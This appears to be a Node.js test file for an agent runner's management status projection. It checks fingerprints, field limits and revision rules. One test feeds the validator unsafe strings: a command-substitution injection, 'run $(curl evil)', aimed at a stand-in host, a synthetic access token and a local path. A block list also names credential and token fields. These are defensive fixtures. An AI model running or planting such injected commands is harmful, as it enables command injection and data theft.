import assert from 'node:assert/strict';
import test from 'node:test';

import {
  buildManagementStatusProjection,
  assertNormalizedStatusProjectionShape,
  reviseManagementStatusProjection,
  statusProjectionPayload,
} from './agent-runner-management-status-projection.mjs';

const T0 = '2026-08-21T20:00:00.000Z';
const T1 = '2026-08-21T20:30:00.000Z';
// Assembled at runtime so the adversarial fixture never appears as a literal
// credential in the checked-in source.
const SYNTHETIC_TOKEN = ['ghp', 'a1b2c3d4e5a1b2c3d4e5a1b2c3'].join('_');

function projectionInput(overrides = {}) {
  return {
    projectId: 'fixture-project',
    repository: 'FixtureOrg/fixture-repo',
    objective: 'Keep the fixture project queue curated deterministically.',
    planRevision: 'qcr:abcdef0123456789abcdef0123456789',
    milestones: [{ id: 'foundation', title: 'Foundation', total: 2, completed: 1, blocked: 0 }],
    counts: { ready: 1, inProgress: 0, blocked: 1, review: 0, completed: 1 },
    criticalPath: [{ curationKey: 'qc:fixture-project:evidence-contract', issueNumber: 501, readiness: 'ready' }],
    currentEvent: { eventId: 'management-abc', eventType: 'programme-reconcile-required', state: 'claimed' },
    lifecycleState: 'awaiting-execution',
    recentDecisions: [{ eventId: 'management-abc', role: 'programme', outcome: 'execution-required', recordedAt: T0 }],
    risks: ['Queue evidence could go stale between reconciliations'],
    blockers: [],
    nextAction: { classification: 'execution-reconcile', eventType: 'execution-reconcile-required', notBefore: null },
    ownerAttentionRequired: false,
    controlMode: 'active',
    updatedAt: T0,
    ...overrides,
  };
}

test('a projection exposes every required bounded field', () => {
  const projection = buildManagementStatusProjection(projectionInput());
  assert.equal(projection.projectId, 'fixture-project');
  assert.equal(projection.repository, 'FixtureOrg/fixture-repo');
  assert.equal(projection.planRevision, 'qcr:abcdef0123456789abcdef0123456789');
  assert.deepEqual(projection.counts, { ready: 1, inProgress: 0, blocked: 1, review: 0, completed: 1 });
  assert.equal(projection.criticalPath[0].issueNumber, 501);
  assert.equal(projection.currentEvent.eventType, 'programme-reconcile-required');
  assert.equal(projection.lifecycleState, 'awaiting-execution');
  assert.equal(projection.nextAction.classification, 'execution-reconcile');
  assert.equal(projection.ownerAttentionRequired, false);
  assert.equal(projection.controlMode, 'active');
  assert.match(projection.projectionFingerprint, /^sha256:[a-f0-9]{64}$/);
  assert.equal(projection.updatedAt, T0);
});

test('an identical semantic projection fingerprints identically even at a later clock', () => {
  const first = buildManagementStatusProjection(projectionInput({ updatedAt: T0 }));
  const second = buildManagementStatusProjection(projectionInput({ updatedAt: T1 }));
  assert.equal(first.projectionFingerprint, second.projectionFingerprint);
  // The payload the store persists and dedupes on carries no timestamp at all.
  assert.equal('updatedAt' in statusProjectionPayload(first), false);
});

test('a semantic change moves the fingerprint', () => {
  const base = buildManagementStatusProjection(projectionInput());
  for (const change of [
    { lifecycleState: 'blocked' },
    { ownerAttentionRequired: true },
    { counts: { ready: 2, inProgress: 0, blocked: 1, review: 0, completed: 1 } },
    { controlMode: 'shadow' },
  ]) {
    const changed = buildManagementStatusProjection(projectionInput(change));
    assert.notEqual(changed.projectionFingerprint, base.projectionFingerprint, JSON.stringify(change));
  }
});

test('a projection refuses an unknown field', () => {
  assert.throws(
    () => buildManagementStatusProjection(projectionInput({ workerTranscript: 'anything' })),
    /is not a recognised field/,
  );
});

test('a projection refuses prompts, provider output, logs, credentials, tokens and local paths by field name', () => {
  for (const field of ['prompt', 'providerOutput', 'transcript', 'stdout', 'logs', 'env', 'token', 'claimToken', 'secret', 'localPath', 'worktreePath', 'balance']) {
    assert.throws(
      () => buildManagementStatusProjection({ ...projectionInput(), [field]: 'x' }),
      /is never projectable|is not a recognised field/,
      field,
    );
  }
});

test('a projection refuses unsafe free text in a bounded prose field', () => {
  for (const unsafe of [
    '/home/gp/projects/agent-runner is the checkout',
    `use token ${SYNTHETIC_TOKEN}`,
    'assistant: here is the plan',
    '2026-08-21T00:00:00Z ERROR the run failed',
    'run $(curl evil)',
  ]) {
    assert.throws(() => buildManagementStatusProjection(projectionInput({ objective: unsafe })), /Invalid agent runner management status projection/, unsafe);
    assert.throws(() => buildManagementStatusProjection(projectionInput({ risks: [unsafe] })), /Invalid agent runner management status projection/, unsafe);
  }
});

test('a projection refuses an out-of-range lifecycle state, next action or control mode', () => {
  assert.throws(() => buildManagementStatusProjection(projectionInput({ lifecycleState: 'running' })), /lifecycleState/);
  assert.throws(() => buildManagementStatusProjection(projectionInput({ nextAction: { classification: 'merge' } })), /nextAction.classification/);
  assert.throws(() => buildManagementStatusProjection(projectionInput({ controlMode: 'enabled' })), /controlMode/);
  assert.throws(
    () => buildManagementStatusProjection(projectionInput({ nextAction: { classification: 'programme-reconcile', eventType: 'delayed-event-ready' } })),
    /nextAction.eventType/,
  );
});

test('a projection refuses malformed identity and unbounded collections', () => {
  assert.throws(() => buildManagementStatusProjection(projectionInput({ repository: 'fixture-repo' })), /repository/);
  assert.throws(() => buildManagementStatusProjection(projectionInput({ counts: { ready: -1, inProgress: 0, blocked: 0, review: 0, completed: 0 } })), /counts.ready/);
  assert.throws(
    () => buildManagementStatusProjection(projectionInput({ criticalPath: [{ curationKey: 'not-a-key', readiness: 'ready' }] })),
    /criticalPath\[0\].curationKey/,
  );
  const tooMany = Array.from({ length: 25 }, (unused, index) => ({ id: `m${index}`, title: `Milestone ${index}`, total: 0, completed: 0, blocked: 0 }));
  assert.throws(() => buildManagementStatusProjection(projectionInput({ milestones: tooMany })), /milestones must contain at most/);
});

test('a hand-built look-alike projection is refused', () => {
  const forged = Object.freeze({ projectId: 'fixture-project', projectionFingerprint: `sha256:${'a'.repeat(64)}` });
  assert.throws(() => assertNormalizedStatusProjectionShape(forged), /was not produced by buildManagementStatusProjection/);
  assert.throws(() => statusProjectionPayload(forged), /was not produced by buildManagementStatusProjection/);
});

test('a revision may change lifecycle fields and nothing else', () => {
  const original = buildManagementStatusProjection(projectionInput());
  const revised = reviseManagementStatusProjection({
    previous: statusProjectionPayload(original),
    changes: { lifecycleState: 'awaiting-review', ownerAttentionRequired: false },
    updatedAt: T1,
  });
  assert.equal(revised.lifecycleState, 'awaiting-review');
  // Programme-owned facts are carried through untouched, never invented.
  assert.deepEqual(revised.counts, original.counts);
  assert.equal(revised.planRevision, original.planRevision);
  assert.notEqual(revised.projectionFingerprint, original.projectionFingerprint);
});

test('a revision that changes nothing semantically dedupes to the same fingerprint', () => {
  const original = buildManagementStatusProjection(projectionInput());
  const revised = reviseManagementStatusProjection({
    previous: statusProjectionPayload(original),
    changes: {},
    updatedAt: T1,
  });
  assert.equal(revised.projectionFingerprint, original.projectionFingerprint);
});

test('a revision may never rewrite programme-owned facts', () => {
  const original = buildManagementStatusProjection(projectionInput());
  for (const field of ['counts', 'criticalPath', 'planRevision', 'milestones', 'objective', 'risks']) {
    assert.throws(
      () => reviseManagementStatusProjection({ previous: statusProjectionPayload(original), changes: { [field]: [] } }),
      /may only change lifecycle fields/,
      field,
    );
  }
});
